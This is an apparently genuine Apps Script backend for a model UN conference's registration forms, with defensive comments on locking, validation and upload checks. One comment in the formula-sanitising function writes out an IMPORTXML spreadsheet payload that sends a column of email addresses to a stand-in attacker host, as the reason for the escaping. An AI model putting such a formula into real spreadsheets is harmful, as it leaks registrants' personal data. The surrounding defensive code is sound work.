/**
 * SOD x BITSMUN 2026 — registration backend.
 *
 * One Apps Script serving all three forms, writing to one spreadsheet with a
 * tab per form. Replaces the five separate deployments used in 2025, which all
 * failed simultaneously when their "Who has access" setting stopped being
 * "Anyone" — fewer deployments means fewer things to get wrong.
 *
 * Deployment instructions are in README.md next to this file.
 *
 * Design notes, in order of how much they matter:
 *
 * 1. Every response is JSON with an explicit `result` field. The 2025 scripts
 *    returned nothing useful, so the site could not tell success from failure
 *    and showed a green tick regardless. The frontend now reads this.
 * 2. Appends are wrapped in a script lock. Apps Script runs concurrent requests
 *    in parallel and getLastRow() is a read-then-write race; without the lock a
 *    registration rush silently overwrites rows.
 * 3. Headers are created on demand, so a fresh spreadsheet needs no setup.
 * 4. Payment screenshots are written to Drive and the row stores a link, rather
 *    than the base64 blob, which would blow past the cell character limit.
 */

var SPREADSHEET_ID = '1DDmZTr4oCZ2YhBIqimecIGTOtmDmJ6VDZEKCOuOQWsI';
var DRIVE_FOLDER_NAME = 'SODxBITSMUN 2026 — Payment Screenshots';
var LOCK_TIMEOUT_MS = 30000;

// This endpoint must be deployed as "Anyone", so treat every field as hostile.
// The frontend's validation is a convenience for honest users; it is trivially
// bypassed by posting straight to the URL.
var MAX_FIELD_CHARS = 1000;        // longest plausible answer; longer is abuse
var MAX_UPLOAD_BYTES = 6 * 1024 * 1024;  // decoded; client budget is 4MB base64
var ALLOWED_UPLOAD_TYPES = {
  'image/jpeg': '.jpg', 'image/png': '.png', 'image/webp': '.webp',
  'image/heic': '.heic', 'application/pdf': '.pdf'
};

/** Column order per tab. Anything posted that is not listed lands in "Extra". */
var SCHEMAS = {
  delegate: {
    sheet: 'Delegates',
    fields: ['name', 'email', 'phone', 'institute', 'mode',
             'committee1', 'committee2', 'experience',
             'portfolio1', 'portfolio2', 'coupon', 'listAmount', 'amount']
  },
  eb: {
    sheet: 'Executive Board',
    fields: ['name', 'email', 'phone', 'committee1', 'committee2',
             'experience', 'ebexperience']
  },
  international: {
    sheet: 'International Delegates',
    fields: ['name', 'email', 'countryName', 'phone', 'institute', 'mode',
             'committee1', 'committee2', 'experience',
             'portfolio1', 'portfolio2', 'coupon', 'listAmount', 'amount']
  }
};

/**
 * Neutralise spreadsheet formula injection.
 *
 * appendRow writes strings as user input, so a value beginning =, +, -, @ or a
 * control character is parsed as a FORMULA, not text. A delegate can put
 * =IMPORTXML("https://attacker.example/?d="&CONCATENATE(C2:C99), "//a") in the
 * name field; it does nothing until an organiser opens the sheet, at which
 * point Sheets executes it under their session and posts every email address in
 * the column to the attacker. Prefixing with an apostrophe forces text.
 */
function sanitiseCell_(value) {
  var s = (value === null || value === undefined) ? '' : String(value);
  if (s.length > MAX_FIELD_CHARS) s = s.slice(0, MAX_FIELD_CHARS) + '…[truncated]';
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s;
}

function isValidEmail_(value) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(value || '').trim());
}

function json_(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

/** Health check. Lets the site verify the deployment without writing a row. */
function doGet() {
  return json_({
    result: 'success',
    service: 'SODxBITSMUN 2026 registrations',
    tabs: Object.keys(SCHEMAS).map(function (k) { return SCHEMAS[k].sheet; }),
    time: new Date().toISOString()
  });
}

function getOrCreateSheet_(ss, name, headers) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) sheet = ss.insertSheet(name);
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(headers);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
  }
  return sheet;
}

function getOrCreateFolder_() {
  var it = DriveApp.getFoldersByName(DRIVE_FOLDER_NAME);
  return it.hasNext() ? it.next() : DriveApp.createFolder(DRIVE_FOLDER_NAME);
}

/**
 * Decode a `data:` URL into Drive and return a viewable link.
 * Returns '' when no file was supplied — resumes and screenshots are optional
 * on some forms, and a missing file must not fail the whole submission.
 */
function saveFile_(dataUrl, fileName, who) {
  if (!dataUrl) return '';
  try {
    var match = String(dataUrl).match(/^data:([^;]+);base64,(.*)$/);
    if (!match) return 'INVALID FILE DATA';

    // Without a type allowlist this is an open "upload anything to our Drive and
    // get a public link" service: the caller controls the MIME type, and the
    // file below is shared ANYONE_WITH_LINK. That is a ready-made host for
    // malware or a phishing page, served from the conference's own Drive.
    var mime = match[1];
    if (!ALLOWED_UPLOAD_TYPES[mime]) return 'REJECTED FILE TYPE: ' + mime;

    // The 4MB cap in the browser is advisory — a direct POST ignores it. Check
    // the encoded length before decoding, so an enormous payload cannot exhaust
    // the script's memory on the way in.
    if (match[2].length > MAX_UPLOAD_BYTES * 1.4) return 'REJECTED: FILE TOO LARGE';
    var bytes = Utilities.base64Decode(match[2]);
    if (bytes.length > MAX_UPLOAD_BYTES) return 'REJECTED: FILE TOO LARGE';

    // The extension comes from the allowlist, not from the caller's filename —
    // an attacker-supplied name like "receipt.jpg.html" must not survive.
    var safeName = (who || 'upload').replace(/[^\w.\- ]/g, '_').slice(0, 60) +
      ' — ' + String(fileName || 'file').replace(/[^\w.\- ]/g, '_').slice(0, 60) +
      ALLOWED_UPLOAD_TYPES[mime];
    var blob = Utilities.newBlob(bytes, mime, safeName);
    var file = getOrCreateFolder_().createFile(blob);
    file.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW);
    return file.getUrl();
  } catch (err) {
    // A Drive failure must not lose the registration; record it in the cell.
    return 'UPLOAD FAILED: ' + err.message;
  }
}

function doPost(e) {
  var lock = LockService.getScriptLock();
  try {
    var params = (e && e.parameter) ? e.parameter : {};
    var type = String(params.formType || 'delegate').toLowerCase();
    var schema = SCHEMAS[type];
    if (!schema) {
      return json_({ result: 'error', message: 'Unknown formType: ' + type });
    }

    if (!params.name || !params.email) {
      return json_({ result: 'error', message: 'Name and email are required.' });
    }
    if (!isValidEmail_(params.email)) {
      return json_({ result: 'error', message: 'That email address is not valid.' });
    }

    // Deliberately BEFORE the lock. A 4MB Drive upload can take several seconds;
    // holding the script lock across it means a registration rush serialises on
    // Drive I/O and later submissions time out with "Server busy". The lock only
    // needs to cover the read-then-write of the sheet.
    var fileUrl = saveFile_(params.fileContent, params.fileName, params.name);

    // Serialise appends. Without this, two submissions arriving together can
    // resolve the same last row and one overwrites the other.
    if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
      return json_({ result: 'error', message: 'Server busy, please retry.' });
    }

    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var headers = ['Timestamp'].concat(schema.fields).concat(['File', 'Extra']);
    var sheet = getOrCreateSheet_(ss, schema.sheet, headers);

    // Guard against a double-click producing two identical rows. Only looks at
    // the recent tail, so it stays cheap as the sheet grows.
    var last = sheet.getLastRow();
    if (last > 1) {
      var lookback = Math.min(15, last - 1);
      var recent = sheet.getRange(last - lookback + 1, 1, lookback, 3).getValues();
      var cutoff = Date.now() - 120000;
      var email = String(params.email).trim().toLowerCase();
      for (var i = 0; i < recent.length; i++) {
        var ts = new Date(recent[i][0]).getTime();
        if (String(recent[i][2]).trim().toLowerCase() === email && ts > cutoff) {
          return json_({ result: 'success', duplicate: true, message: 'Already recorded.' });
        }
      }
    }

    // Anything posted but not in the schema is preserved rather than dropped,
    // so a form change never silently loses data.
    var known = { formType: 1, fileContent: 1, fileName: 1 };
    schema.fields.forEach(function (f) { known[f] = 1; });
    var extra = Object.keys(params)
      .filter(function (k) { return !known[k]; })
      .slice(0, 40)
      .map(function (k) { return k + '=' + String(params[k]).slice(0, 200); })
      .join('; ');

    var row = [new Date()];
    schema.fields.forEach(function (f) {
      // Not `params[f] || ''` — that turns a legitimate 0 (a fully discounted
      // amount) into a blank cell, which reads as missing data rather than free.
      var v = params[f];
      row.push(sanitiseCell_(v === undefined || v === null ? '' : v));
    });
    row.push(fileUrl);
    row.push(sanitiseCell_(extra));

    sheet.appendRow(row);

    return json_({ result: 'success', sheet: schema.sheet, row: sheet.getLastRow() });
  } catch (err) {
    return json_({ result: 'error', message: err.message });
  } finally {
    try { lock.releaseLock(); } catch (ignored) {}
  }
}
